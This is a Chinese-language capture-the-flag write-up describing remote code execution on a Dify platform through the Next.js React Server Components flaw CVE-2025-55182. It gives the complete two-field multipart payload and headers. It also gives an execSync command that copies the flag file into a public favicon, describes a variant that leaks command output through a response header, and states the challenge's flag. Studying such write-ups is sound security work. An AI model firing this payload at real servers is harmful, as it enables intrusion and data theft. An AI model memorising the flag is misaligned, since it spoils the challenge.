## 题目原文

> 请对目标AI应用平台进行安全测试与漏洞挖掘。

## 题解

### 入口与指纹

首页 307 到 `/apps`。页面是 Dify 的 Next.js 前端。`/app/web/package.json` 的版本是 `1.9.2`，同目录下的 Next.js 是 `15.5.6`。`/console/api/setup` 返回的仍是这套前端 HTML，Python API 没有挂在这个端口上。前端配置里的 API 地址是 `http://127.0.0.1:5001`。

### 关键观察

`POST /apps` 会处理 React Server Components 的 multipart 载荷。载荷里的 `_prefix` 会被当作代码执行；这与 CVE-2025-55182（react2shell）的利用形状一致，`_formData.get` 指向 `$1:constructor:constructor` 取到宿主的 `Function`。

最小的可用 payload 只有两个字段：

- 字段 `0`：`{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"<JS>","_formData":{"get":"$1:constructor:constructor"}}}`
- 字段 `1`：`"$@0"`

请求头是 `Next-Action: x` 和 `Content-Type: multipart/form-data; boundary=...`。

### 利用链

**最短路径：写静态文件再取回。** `_prefix` 里执行 `process.mainModule.require('child_process').execSync('cp /challenge/flag.txt /app/web/public/favicon.ico')`，请求本身会因为 `execSync` 卡住而超时，但副作用已经发生；随后 `GET /favicon.ico` 就是 flag。

早期版本用的是 6 字段形式（`_prefix` 在字段 5，`_chunks = $2:_response:_chunks`，`_bundlerConfig = {}`），把 `execFileSync` 的输出 base64 放进 `x-action-redirect`。两条路等价，能拿到 `favicon.ico` 时优先用前者。本次平台接受的值是 `flag{4c604dff-65c8-477d-845d-a8b3d14e7b8b}`。

### flag 位置

`/challenge/flag.txt`。前端页面和 `package.json` 里都没有 flag。
